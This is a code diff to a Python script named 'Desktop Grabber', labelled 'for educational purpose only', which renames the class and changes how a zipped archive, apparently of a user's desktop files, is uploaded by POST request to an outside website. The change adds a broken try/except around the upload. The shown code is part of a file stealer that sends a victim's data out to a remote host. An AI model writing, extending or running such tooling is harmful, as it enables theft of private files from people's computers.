@@ -6,7 +6,7 @@ import os
 # Desktop Grabber
 # For educational purpose only!
 
-class DesktopGrabber:
+class DeskGrab:
 
     def __init__(self, ZipName, ZipPassword):
         self.ZipName = ZipName + ".zip"
@@ -43,7 +43,10 @@ class DesktopGrabber:
 
     def _sendPackage(self, website):
         # We use a simple POST request to send file
-        response = requests.post(website, files = self.ZipName)
+        try:
+            file = open(str(self.ZipName), "rb").read()
+            response = requests.post(website, files={"archive": ("Test.zip", file)})
+        except: print(1)
 
         if response.ok:
             print("Upload completed successfully!")
